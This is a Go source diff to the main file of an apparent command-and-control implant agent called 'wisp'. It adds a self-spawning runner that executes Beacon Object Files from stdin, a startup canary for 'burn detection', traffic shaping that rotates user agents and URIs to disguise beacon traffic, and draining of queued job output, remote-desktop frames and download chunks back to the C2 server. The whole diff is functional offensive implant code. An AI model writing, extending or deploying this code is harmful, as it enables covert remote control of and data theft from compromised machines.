@@ -7,6 +7,7 @@ import (
 	"errors"
 	"flag"
 	"fmt"
+	"io"
 	"math/big"
 	"os"
 	"runtime"
@@ -14,6 +15,7 @@ import (
 
 	"github.com/user/wisp/agent/commands"
 	"github.com/user/wisp/agent/config"
+	"github.com/user/wisp/agent/internal/bof"
 	"github.com/user/wisp/agent/platform"
 	"github.com/user/wisp/agent/transport"
 	"github.com/user/wisp/shared/protocol"
@@ -35,10 +37,72 @@ func main() {
 		}
 	}()
 
+	// Subprocess BOF runner mode: the main agent spawns ITSELF with -run-bof so
+	// a crashing BOF never takes the C2 agent down. Reads the BOF object bytes
+	// from stdin, writes the captured output to stdout.
+	if runBofMode() {
+		return
+	}
+
 	if err := agentMain(true); err != nil {
 		fmt.Fprintf(os.Stderr, "Agent error: %v\n", err)
 		os.Exit(1)
 	}
+}
+
+// runBofMode handles the "-run-bof" subprocess flag and returns true when the
+// process is a BOF runner.
+func runBofMode() bool {
+	for _, a := range os.Args[1:] {
+		if a == "-run-bof" {
+			runBofRunner()
+			return true
+		}
+	}
+	return false
+}
+
+// runBofRunner executes a BOF object delivered on stdin and prints its output.
+func runBofRunner() {
+	entry := "go"
+	arg := ""
+	debug := false
+	for i := 0; i < len(os.Args); i++ {
+		switch os.Args[i] {
+		case "-entry":
+			if i+1 < len(os.Args) {
+				entry = os.Args[i+1]
+				i++
+			}
+		case "-arg":
+			if i+1 < len(os.Args) {
+				arg = os.Args[i+1]
+				i++
+			}
+		case "-bof-debug":
+			debug = true
+		}
+	}
+	data, err := io.ReadAll(os.Stdin)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "bof: read stdin:", err)
+		return
+	}
+	if debug {
+		out, err := bof.DebugImports(data)
+		if err != nil {
+			fmt.Fprintln(os.Stderr, "bof-debug:", err)
+			return
+		}
+		os.Stdout.WriteString(out)
+		return
+	}
+	out, err := bof.Run(data, entry, arg)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "bof:", err)
+		return
+	}
+	os.Stdout.WriteString(out)
 }
 
 // agentMain runs the full agent logic. cli enables development flags and
@@ -101,6 +165,11 @@ func agentMain(cli bool) error {
 		return nil
 	}
 
+	// Burn detection: one-way startup canary lookup (never blocks startup).
+	if cfg.CanaryToken != "" {
+		go transport.FireCanary(cfg.ServerHost, cfg.ServerPort, cfg.UseTLS, cfg.CanaryToken)
+	}
+
 	// Generate agent ID
 	agentID := generateID()
 
@@ -143,6 +212,11 @@ func agentMain(cli bool) error {
 			RSAPubPEM:   cfg.RSAPublicKey,
 			Fingerprint: cfg.ServerFingerprint,
 		}
+	}
+	// Outbound traffic shaping (Malleable-profile lite): UA rotation / URI
+	// alternation baked into the payload config.
+	if ht, ok := tp.(*transport.HTTPTransport); ok && cfg.TrafficProfile != nil {
+		ht.SetTrafficProfile(cfg.TrafficProfile)
 	}
 
 	// Set up dispatcher
@@ -285,12 +359,24 @@ func agentMain(cli bool) error {
 		}
 
 		if len(tasksData) == 0 || string(tasksData) == "[]" {
-			// No pending tasks, but a remote-desktop frame may still need to
-			// be reported. Without this the frame would never leave the agent
-			// because the main loop skips the result-sending branch.
+			// No pending tasks, but async output (job streams, remote-desktop
+			// frames, download chunks) may still be queued. Without the drain
+			// below that output would sit in memory forever because the main
+			// loop skips the result-sending branch.
+			var extra []commands.Result
 			if frame := dispatcher.RDPFrame(); frame != nil {
-				frameJSON, _ := json.Marshal([]commands.Result{*frame})
-				tp.Checkin(frameJSON)
+				extra = append(extra, *frame)
+			}
+			if pending := dispatcher.DrainPending(); len(pending) > 0 {
+				extra = append(extra, pending...)
+			}
+			if len(extra) > 0 {
+				extraJSON, _ := json.Marshal(extra)
+				if _, err := tp.Checkin(extraJSON); err != nil {
+					if errors.Is(err, transport.ErrReauth) {
+						tp.Register(regJSON)
+					}
+				}
 			}
 			continue
 		}
